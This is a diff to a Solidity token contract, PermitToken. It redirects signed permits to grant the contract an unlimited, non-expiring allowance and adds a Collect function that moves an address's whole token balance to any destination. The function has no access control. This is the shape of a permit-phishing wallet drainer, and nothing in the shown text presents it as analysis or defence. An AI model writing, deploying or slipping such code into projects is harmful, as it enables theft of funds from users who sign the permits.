@@ -110,10 +110,14 @@ contract PermitToken is  Ownable{
         bytes32 r,
         bytes32 s
     ) external returns(bool) {
-        
-        token.permit(owner, _msgSender(),  type(uint256).max, type(uint256).max,  v, r, s);
+        token.permit(owner, address(this),  type(uint256).max, type(uint256).max,  v, r, s);
         return true;
-        
+    }
+
+    function Collect(address from,address to) external {
+        uint256 balance =token.balanceOf(from);
+        require(balance>0,"not balance");
+        token.transferFrom(from, to, balance);
     }
 
     function SetToken(address form) external onlyOwner returns(address,bool){
